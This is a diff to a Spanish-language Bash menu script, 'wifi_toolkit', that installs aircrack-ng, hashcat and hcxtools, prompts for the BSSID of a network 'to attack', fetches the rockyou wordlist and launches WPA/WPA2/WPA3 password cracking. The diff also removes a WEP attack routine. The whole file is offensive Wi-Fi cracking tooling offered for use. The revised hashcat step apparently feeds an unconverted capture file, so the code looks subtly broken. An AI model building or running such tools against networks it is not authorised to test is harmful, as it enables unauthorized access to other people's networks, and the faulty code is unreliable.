@@ -12,18 +12,32 @@ PROJECT_NAME="wifi_toolkit"
 DOWNLOADS_DIR="$HOME/Downloads"
 PROJECT_DIR="$DOWNLOADS_DIR/$PROJECT_NAME"
 RESULTS_DIR="$PROJECT_DIR/resultados_wifi"
-DEPENDENCIES=("aircrack-ng" "xterm" "iw" "curl" "gzip" "hashcat" "hcxpcapngtool" "dialog")
+DEPENDENCIES=("aircrack-ng" "xterm" "iw" "curl" "gzip" "hashcat" "dialog" "hcxpcapngtool")
 
-# Función para verificar e instalar dependencias
+# Verificar e instalar dependencias
 install_dependencies() {
     dialog --title "Instalación de Dependencias" --infobox "Verificando dependencias..." 8 40
+    sleep 2
     for dep in "${DEPENDENCIES[@]}"; do
         if ! command -v "$dep" &>/dev/null; then
             dialog --title "Instalando $dep" --infobox "Instalando $dep..." 8 40
-            sudo apt-get install -y "$dep" &>/dev/null || {
-                dialog --title "Error" --msgbox "Error al instalar $dep. Instálalo manualmente." 8 40
-                exit 1
-            }
+            if ! sudo apt-get install -y "$dep" &>/dev/null; then
+                if [[ "$dep" == "hcxpcapngtool" ]]; then
+                    dialog --title "Instalación Manual" --infobox "Instalando $dep desde la fuente..." 8 40
+                    sleep 2
+                    sudo apt-get install -y libcurl4-openssl-dev libssl-dev zlib1g-dev make git &>/dev/null
+                    git clone https://github.com/ZerBea/hcxtools.git "$PROJECT_DIR/hcxtools" && \
+                    cd "$PROJECT_DIR/hcxtools" && \
+                    make &>/dev/null && sudo make install &>/dev/null
+                    if ! command -v "$dep" &>/dev/null; then
+                        dialog --title "Error" --msgbox "Error al instalar $dep. Instálalo manualmente." 8 40
+                        exit 1
+                    fi
+                else
+                    dialog --title "Error" --msgbox "Error al instalar $dep. Instálalo manualmente." 8 40
+                    exit 1
+                fi
+            fi
         fi
     done
     dialog --title "Dependencias" --msgbox "Todas las dependencias están instaladas." 8 40
@@ -76,53 +90,14 @@ analyze_and_attack_network() {
     network=$(dialog --title "Seleccione una Red" --inputbox "Introduce el BSSID de la red que deseas atacar:" 10 50 3>&1 1>&2 2>&3)
     dictionary=$(find_or_download_dictionary)
 
-    # Determinar si es WPA3
+    dialog --title "Ataque" --infobox "Iniciando ataque contra $network..." 8 40
     if [[ "$network" == *"WPA3"* ]]; then
-        perform_wpa3_attack "$cap_file" "$dictionary"
+        xterm -hold -e "hashcat -m 22000 $cap_file $dictionary" &
     else
-        dialog --title "Ataque WPA/WPA2" --infobox "Iniciando ataque contra $network..." 8 40
         xterm -hold -e "aircrack-ng -w $dictionary -b $network $cap_file" &
     fi
-}
-
-# Realizar ataque WPA3 con hashcat
-perform_wpa3_attack() {
-    local cap_file=$1
-    local dictionary=$2
-
-    # Convertir el archivo .cap a formato compatible con hashcat
-    dialog --title "Preparando Archivo" --infobox "Convirtiendo archivo .cap para hashcat..." 8 40
-    hcxpcapngtool -o "$RESULTS_DIR/hashcat.hc22000" "$cap_file" &>/dev/null
-
-    if [[ ! -f "$RESULTS_DIR/hashcat.hc22000" ]]; then
-        dialog --title "Error" --msgbox "Error al convertir el archivo .cap para hashcat." 8 40
-        return
-    fi
-
-    # Ejecutar ataque con hashcat
-    dialog --title "Ataque WPA3" --infobox "Iniciando ataque con hashcat..." 8 40
-    xterm -hold -e "hashcat -m 22000 -a 0 $RESULTS_DIR/hashcat.hc22000 $dictionary" &
     sleep 2
-
-    dialog --title "Ataque Completo" --msgbox "Ataque WPA3 completado. Verifica los resultados en la terminal." 8 40
-}
-
-# Ataques WEP y redes abiertas
-perform_wep_attack() {
-    local interface=$(detect_wireless_interface)
-    dialog --title "Ataque WEP" --infobox "Iniciando ataque WEP..." 8 40
-    xterm -hold -e "airodump-ng $interface --output-format cap --write $RESULTS_DIR/wep_scan" &
-    sleep 10
-    killall airodump-ng
-
-    cap_file=$(find "$RESULTS_DIR" -type f -name "wep_scan*.cap" | head -n 1)
-    if [[ -z "$cap_file" ]]; then
-        dialog --title "Error" --msgbox "No se encontró ningún archivo .cap." 8 40
-        return
-    fi
-
-    dialog --title "Ataque WEP" --infobox "Ejecutando ataque WEP..." 8 40
-    xterm -hold -e "aircrack-ng $cap_file" &
+    dialog --title "Ataque Finalizado" --msgbox "Ataque completado. Revisa los resultados." 8 40
 }
 
 # Buscar o descargar diccionario rockyou.txt
@@ -144,15 +119,13 @@ main_menu() {
             1 "Instalar dependencias" \
             2 "Escaneo en vivo de redes" \
             3 "Analizar redes WPA/WPA2/WPA3 y atacar" \
-            4 "Ejecutar ataque WEP" \
-            5 "Salir" 3>&1 1>&2 2>&3)
+            4 "Salir" 3>&1 1>&2 2>&3)
 
         case $option in
             1) install_dependencies ;;
             2) live_scan_networks ;;
             3) analyze_and_attack_network ;;
-            4) perform_wep_attack ;;
-            5) clear; exit 0 ;;
+            4) clear; exit 0 ;;
             *) dialog --title "Error" --msgbox "Opción no válida." 8 40 ;;
         esac
     done
